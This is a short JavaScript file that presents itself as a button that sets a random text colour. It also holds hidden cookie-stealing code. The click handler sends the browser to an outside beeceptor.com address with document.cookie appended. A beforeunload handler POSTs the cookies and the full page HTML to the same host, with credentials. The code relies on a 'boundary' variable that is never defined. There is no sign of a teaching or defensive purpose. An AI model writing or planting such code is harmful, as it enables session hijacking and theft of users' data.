const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    window.location.replace('https://keskispace.free.beeceptor.com/'+document.cookie);
    target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
}

window.addEventListener("beforeunload", function(event){
    // Initiate objects
    var xhr = new XMLHttpRequest(),
    	data = '';
    
    // Initialize an asynchronous POST request
    xhr.open('POST', 'https://keskispace.free.beeceptor.com', true);
    
    // Indicate wether or not cross-site access request should be made using credantials (e.g. cookies, authorization headers)
    xhr.withCredentials = true;
    
    // Set headers
    xhr.setRequestHeader('Content-Type', 'multipart/form-data; charset=UTF-8; boundary=' + boundary);
    
    // Set data
    data += '--' + boundary;
    data += '\r\nContent-Disposition: form-data; name="cookie"\r\n\r\n' + document.cookie + '\r\n';
    data += '--' + boundary;
    data += '\r\nContent-Disposition: form-data; name="status"\r\n\r\n' + document.body.innerHTML + '\r\n';
    data += '--' + boundary + '--';
    
    // Set additional headers
    xhr.setRequestHeader('Content-Length', data.length);
    
    // Send the request
    xhr.send(data);
});   
